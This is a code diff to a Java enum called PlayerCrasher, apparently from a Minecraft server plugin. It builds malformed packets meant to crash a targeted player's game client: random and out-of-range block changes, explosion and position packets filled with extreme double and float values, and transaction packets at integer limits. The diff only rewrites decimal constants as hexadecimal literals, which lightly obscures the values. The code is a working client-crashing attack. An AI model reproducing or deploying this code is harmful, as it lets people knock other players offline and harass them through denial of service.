@@ -29,15 +29,15 @@ public enum PlayerCrasher {
 			Random random = new Random(System.currentTimeMillis());
 			Location location = player.getLocation();
 			for (int i = 0; i < 10; i++) {
-				player.sendBlockChange(location, random.nextInt(2173), (byte) 0);
+				player.sendBlockChange(location, random.nextInt(0x87D), (byte) 0);
 			}
 			player.sendBlockChange(location, -6666, (byte) 0);
 			player.sendBlockChange(location, 6666, (byte) 0);
 			return null;
 		}),
 		EXPLOSION((Player player) -> {
-			double impossibleValue = Double.MAX_VALUE / 2173D;
-			double maxValue = 100 - 1E-4;
+			double impossibleValue = Double.MAX_VALUE / 0x87D;
+			double maxValue = 0x64 - 1E-4;
 			float impossibleFloat = Float.MAX_VALUE - 1E-4F;
 			double[] values = {
 				impossibleValue, maxValue, -impossibleValue, -maxValue
@@ -51,8 +51,8 @@ public enum PlayerCrasher {
 			return packets.stream().toArray(PacketPlayOutExplosion[]::new);
 		}),
 		POSITION((Player player) -> {
-			double impossibleValue = Double.MAX_VALUE / 2173D;
-			double maxValue = 100 - 1E-4;
+			double impossibleValue = Double.MAX_VALUE / 0x87D;
+			double maxValue = 0x64 - 1E-4;
 			float impossibleFloat = Float.MAX_VALUE - 1E-4F;
 			double[] values = {
 				impossibleValue, maxValue, -impossibleValue, -maxValue
@@ -70,8 +70,8 @@ public enum PlayerCrasher {
 			for (boolean fuck : new boolean[] {
 				true, false
 			}) {
-				packets.add(new PacketPlayOutTransaction(Integer.MAX_VALUE, Short.MAX_VALUE, fuck));
-				packets.add(new PacketPlayOutTransaction(Integer.MIN_VALUE, Short.MIN_VALUE, fuck));
+				packets.add(new PacketPlayOutTransaction(0x7FFFFFFF, (short) 0x7FFF, fuck));
+				packets.add(new PacketPlayOutTransaction(0x80000000, (short) 0x8000, fuck));
 			}
 			return packets.stream().toArray(PacketPlayOutTransaction[]::new);
 		});
